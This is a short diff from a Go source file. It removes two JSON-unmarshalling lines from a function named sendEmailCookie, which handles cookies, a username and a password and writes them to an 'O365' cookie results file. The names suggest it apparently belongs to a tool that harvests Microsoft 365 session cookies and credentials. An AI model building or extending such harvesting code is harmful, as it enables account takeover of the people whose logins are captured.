@@ -98,8 +98,6 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
-	var cook Cookies
-	json.Unmarshal(postBody, &cook)
 	
 	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
 	if err != nil {
